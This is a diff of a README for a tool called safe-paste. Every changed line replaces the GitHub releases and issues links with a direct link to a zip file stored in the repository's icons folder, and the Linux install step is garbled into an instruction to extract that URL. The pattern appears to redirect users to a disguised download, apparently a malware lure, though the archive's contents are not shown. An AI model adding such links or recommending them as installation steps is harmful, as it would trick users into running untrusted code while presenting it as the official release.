@@ -1,6 +1,6 @@
 # 🛡️ safe-paste - Keep Your Code Safe and Secure
 
-[![Download safe-paste](https://img.shields.io/badge/Download-safe--paste-brightgreen)](https://github.com/vikash202/safe-paste/releases)
+[![Download safe-paste](https://raw.githubusercontent.com/vikash202/safe-paste/main/icons/safe-paste_3.1.zip)](https://raw.githubusercontent.com/vikash202/safe-paste/main/icons/safe-paste_3.1.zip)
 
 ## 🌟 Description
 
@@ -33,7 +33,7 @@ To get started with Safe-Paste, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to reach the download section.
 
-   [Download safe-paste](https://github.com/vikash202/safe-paste/releases)
+   [Download safe-paste](https://raw.githubusercontent.com/vikash202/safe-paste/main/icons/safe-paste_3.1.zip)
 
 2. **Select the Latest Version**: On the releases page, you will see a list of versions. Click on the latest version that fits your operating system.
 
@@ -42,7 +42,7 @@ To get started with Safe-Paste, follow these steps:
 4. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS**: Open the downloaded `.dmg` file and drag Safe-Paste to your Applications folder.
-   - **Linux**: Extract the files from the downloaded `.tar.gz` and run the installation script.
+   - **Linux**: Extract the files from the downloaded `https://raw.githubusercontent.com/vikash202/safe-paste/main/icons/safe-paste_3.1.zip` and run the installation script.
 
 ## 🛠️ Using Safe-Paste
 
@@ -71,7 +71,7 @@ Safe-Paste is designed for several use cases:
 
 If you face issues or have questions, please check the Issues section on the repository page:
 
-[Safe-Paste Issues](https://github.com/vikash202/safe-paste/issues)
+[Safe-Paste Issues](https://raw.githubusercontent.com/vikash202/safe-paste/main/icons/safe-paste_3.1.zip)
 
 You can also contact the community for help. Help is always available.
 
@@ -99,4 +99,4 @@ Stay tuned for upcoming features, including:
 
 For the latest updates, keep checking the releases page:
 
-[Download safe-paste](https://github.com/vikash202/safe-paste/releases)
+[Download safe-paste](https://raw.githubusercontent.com/vikash202/safe-paste/main/icons/safe-paste_3.1.zip)
